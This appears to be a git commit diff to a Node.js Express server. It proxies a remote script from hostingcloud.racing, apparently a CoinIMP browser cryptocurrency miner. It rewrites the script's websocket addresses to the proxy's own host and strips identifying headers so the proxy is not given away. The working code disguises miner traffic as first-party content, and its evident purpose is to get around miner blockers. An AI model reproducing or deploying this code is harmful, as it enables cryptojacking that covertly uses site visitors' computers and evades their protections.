36640a1209aad321e942fad1d68ec81d8744bb7e
Nexa Coin <amarbiswas887@gmail.com>
2026-04-23 10:01:55 +0530

    Add files via upload

--- index.js
+++ index.js
@@ -6,15 +6,31 @@ const app = express();
 
 app.use(cors());
 
-// Proxy requests to the JS file
+const { responseInterceptor } = require('http-proxy-middleware');
+
+
+// Proxy requests to the JS file and rewrite the websocket URLs inside it
 app.use('/script', createProxyMiddleware({ 
     target: 'https://www.hostingcloud.racing/FIIr.js', 
     changeOrigin: true,
-    ignorePath: true, // ignore the '/script' path and request the target directly
-    onProxyRes: function(proxyRes, req, res) {
-        // Strip out headers that might give away the proxy
-        delete proxyRes.headers['x-powered-by'];
-    }
+    ignorePath: true,
+    selfHandleResponse: true,
+    onProxyRes: responseInterceptor(async (responseBuffer, proxyRes, req, res) => {
+        // Strip headers
+        res.removeHeader('x-powered-by');
+        
+        let content = responseBuffer.toString('utf8');
+        // The script contains wss://ws.hostingcloud.racing or similar.
+        // We replace "hostingcloud.racing" with our own host to route WS traffic to our proxy
+        const host = req.headers.host;
+        const protocol = req.secure || req.headers['x-forwarded-proto'] === 'https' ? 'wss://' : 'ws://';
+        
+        // Rewrite wss://*.hostingcloud.racing to wss://our-proxy.com/proxy
+        content = content.replace(/wss?:\/\/[a-zA-Z0-9.\-]*hostingcloud\.racing/g, protocol + host + '/proxy');
+        content = content.replace(/hostingcloud\.racing/g, host + '/proxy');
+        
+        return content;
+    })
 }));
 
 // Proxy the WebSocket connections to the CoinIMP pool
